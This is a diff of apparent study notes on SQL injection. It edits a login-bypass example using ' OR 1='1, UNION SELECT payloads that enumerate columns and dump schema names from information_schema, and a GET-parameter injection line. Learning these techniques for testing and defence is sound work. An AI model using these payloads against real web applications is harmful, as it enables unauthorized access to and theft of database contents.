@@ -392,7 +392,7 @@ Example - Injecting Your Statement
 User enters tom' OR 1='1 in the name and pass fields.
 
 
-Truth Statement: tom ' OR 1='1
+Truth Statement: <vaid query> ' OR 1='1
 
 
 Server-Side query executed would appear like this:
@@ -436,8 +436,7 @@ Audi ' UNION SELECT 1,2,3,4 #' <- Do this to see how many fields the request wan
 UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #                     <- add buffer numbers (2 and 5) so that the golden statement will run
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Get edition SQL injection
-CREVjLhhneaXcpyHZ7W9
+GET SQL injection
 ##Identify Vulnerable field 
 ?Selection=4 OR 1=1
 
